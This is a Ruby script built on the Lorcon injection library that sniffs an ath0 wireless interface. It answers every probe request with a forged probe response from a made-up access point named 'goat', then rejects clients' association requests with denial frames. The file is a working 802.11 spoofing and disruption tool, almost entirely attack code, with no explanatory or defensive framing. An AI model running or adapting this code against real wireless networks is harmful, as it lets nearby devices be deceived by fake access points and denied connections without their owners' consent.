#!/usr/bin/ruby

require 'packetset'
require 'Lorcon'
require 'specialized/dot11'
require 'baflle-recv'

trap "INT" do
  puts "exiting"
  puts "clients"
  p $clients
  puts "auth_counts"
  p $auth_counts
  puts "deauth_counts"
  p $deauth_counts
  exit
end

$ap = "ba:aa:ad:f0:00:0d"

$evil_probe_response = Dot11.new(
                        :subtype =>   0x5,
                        :type =>      0x0,
                        :version =>   0x0,
                        :flags =>     0x0,
                        :duration =>  0x0000,
                        :addr1 =>     0,
                        :addr2 =>     0,
                        :addr3 =>     0,
                        :sc =>        0x0000) /
                        Dot11ProbeResp.new(:timestamp => 0, :beacon_interval => 0x6400, :capabilities => 0x2100) /
                          Dot11Elt.new(
                            :id =>           0x00,
                            :info_length =>  4,
                            :info =>         "goat") /
                          Dot11Elt.new(
                            :id =>           0x01,
                            :info_length =>  0x08,
                            :info =>         [0x82, 0x84, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24].pack("c*"))
                            
$go_away = Dot11.new(
             :subtype =>  0x1,
             :type =>     0x0,
             :version =>  0x0,
             :flags =>    0x0,
             :duration => 0x0,
             :addr1 =>    0x0,
             :addr2 =>    0x0,
             :addr3 =>    0x0,
             :sc =>       0x0) /
             Dot11AssoResp.new(:capabilities => 0x0401, :status => 12, :aid => 0)

$clients = {}
$auth_counts = Hash.new(0)
$deauth_counts = Hash.new(0)

def generate_address(parameter)
  MACAddress.new(0xbaaaad000000 | (parameter & 0xffffff))
end

def emit(packet)
  @device.write(packet, 1, 0)
end

@device = Lorcon::Device.new("ath0", "madwifing", 1)

=begin
emitter = Thread.new do
    while (true)
      emit $evil_probe_response.data
      sleep(0.01)
    end
end
=end

sniff "ath0" do |packet|
  if packet.type == 0 && packet.subtype == 4 #&& packet.payload.elements_by_id[0].essid == "goat"

    puts "responding to probe request from #{packet.addr2}!"
    
    ap_address = $clients[packet.addr2] || generate_address($clients.size)
    
    $evil_probe_response.addr1 = packet.addr2
    $evil_probe_response.addr2 = ap_address
    $evil_probe_response.addr3 = ap_address
    $evil_probe_response.payload.timestamp = (Time.now.to_f * 1000000).to_i
    
    emit $evil_probe_response.data
    
    $clients[packet.addr2] = ap_address
  else
    if packet.addr1[0] != 0xff && $clients[packet.addr2] == packet.addr1
      if packet.subtype == 11
        $go_away.addr1 = packet.addr2
        $go_away.addr2 = packet.addr1
        $go_away.addr3 = packet.addr1
        
        emit $go_away.data
      end
    end
  end
end
